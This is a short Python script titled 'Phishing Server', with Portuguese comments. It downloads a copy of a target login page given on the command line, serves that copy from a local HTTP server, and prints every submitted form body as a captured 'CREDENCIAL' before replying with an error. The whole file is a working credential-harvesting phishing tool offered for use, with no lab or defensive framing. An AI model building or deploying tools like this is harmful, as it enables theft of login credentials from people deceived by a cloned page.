
# Phishing Server

# Importando as Bibliotecas
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import sys

# Classe para o servidor HTTP
class MyRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')  # CORREÇÃO: sand_header => send_header
        self.end_headers()
        try:
            with open('cloned_page.html', 'r', encoding='utf-8') as file:  # CORREÇÃO: enconding => encoding
                self.wfile.write(file.read().encode('utf-8'))
        except FileNotFoundError:
            self.wfile.write(b"Erro: Página clonada não encontrada.")

    # Captura de requisições POST
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f" => CREDENCIAL: \n{post_data.decode('utf-8')}")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write("error".encode('utf-8'))

# Função para clonar a página de login
def clone_and_save_page(url):  # CORREÇÃO: clone_and_save_pager => clone_and_save_page
    response = requests.get(url)
    if response.status_code == 200:
        with open('cloned_page.html', 'w', encoding='utf-8') as file:
            file.write(response.text)
    else:
        print(f"[!] Falha ao acessar a URL. Status code: {response.status_code}")

# Iniciar servidor HTTP
def run_http_server(ip, port):
    server_address = (ip, port)
    httpd = HTTPServer(server_address, MyRequestHandler)
    print(f'Server running at {ip}:{port}, serving content from cloned_page.html')
    httpd.serve_forever()

# Definindo os argumentos
if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python script.py <target_url> <server_ip> <server_port>")
        sys.exit(1)

    target_url = sys.argv[1]
    server_ip = sys.argv[2]
    server_port = int(sys.argv[3])
    clone_and_save_page(target_url)
    server_thread = threading.Thread(target=run_http_server, args=(server_ip, server_port))
    server_thread.start()
